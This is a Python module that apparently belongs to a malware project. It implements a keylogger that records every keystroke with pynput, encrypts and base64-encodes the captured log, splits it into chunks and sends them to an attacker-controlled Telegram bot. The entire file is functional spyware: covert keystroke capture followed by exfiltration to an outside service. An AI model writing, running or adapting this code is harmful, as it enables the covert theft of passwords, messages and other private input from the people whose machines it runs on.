import base64
import threading
import time
import logging
from pynput import keyboard
from cryptography.fernet import Fernet
from modules.network import send_to_telegram

keystrokes = []
keylogger_lock = threading.Lock()

def on_press(key):
    try:
        with keylogger_lock:
            keystrokes.append(key.char)
    except AttributeError:
        with keylogger_lock:
            keystrokes.append(f"[{key.name}]")

def encrypt_data(data):
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted = f.encrypt(data)
    return key + b"::" + encrypted

def exfiltrate_keystrokes(bot_token, chat_id):
    with keylogger_lock:
        data = "".join(keystrokes).encode()
    if data:
        encrypted_data = encrypt_data(data)
        b64_data = base64.b64encode(encrypted_data).decode()
        chunks = [b64_data[i:i+4000] for i in range(0, len(b64_data), 4000)]
        for chunk in chunks:
            send_to_telegram(bot_token, chat_id, f"Keylog data chunk:\n{chunk}")

def start_keylogger(duration, bot_token, chat_id):
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(duration)
    listener.stop()
    exfiltrate_keystrokes(bot_token, chat_id)